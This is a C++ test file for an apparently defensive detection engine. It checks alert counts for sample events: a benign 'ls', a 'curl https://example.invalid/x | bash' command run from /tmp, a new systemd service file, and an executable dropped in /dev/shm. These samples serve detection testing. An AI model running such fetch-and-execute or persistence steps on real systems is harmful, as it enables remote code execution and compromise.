#include <cstdlib>
#include <iostream>

#include <sentcore/core/event.hpp>
#include <sentcore/detection/detection_engine.hpp>

namespace
{

bool expect_count(const sentcore::DetectionEngine& engine,
                  const sentcore::Event& event,
                  std::size_t expected)
{
    const auto result = engine.evaluate(event);
    if (result.count != expected)
    {
        std::cerr << "Expected " << expected << " alerts, got " << result.count << '\n';
        return false;
    }
    return true;
}

} // namespace

int main()
{
    sentcore::DetectionEngine engine{};

    sentcore::Event benign{};
    benign.type = sentcore::EventType::ProcessStart;
    benign.path.assign("/usr/bin/ls");
    benign.command.assign("ls -la");
    if (!expect_count(engine, benign, 0U))
    {
        return EXIT_FAILURE;
    }

    sentcore::Event suspicious{};
    suspicious.type = sentcore::EventType::ProcessStart;
    suspicious.path.assign("/tmp/payload");
    suspicious.command.assign("curl https://example.invalid/x | bash");
    if (!expect_count(engine, suspicious, 2U))
    {
        return EXIT_FAILURE;
    }

    sentcore::Event systemd{};
    systemd.type = sentcore::EventType::FileCreated;
    systemd.path.assign("/etc/systemd/system/update.service");
    if (!expect_count(engine, systemd, 1U))
    {
        return EXIT_FAILURE;
    }

    sentcore::Event executable_temp{};
    executable_temp.type = sentcore::EventType::FileCreated;
    executable_temp.path.assign("/dev/shm/tool");
    executable_temp.mode = 0755U;
    if (!expect_count(engine, executable_temp, 1U))
    {
        return EXIT_FAILURE;
    }

    std::cout << "All detection tests passed.\n";
    return EXIT_SUCCESS;
}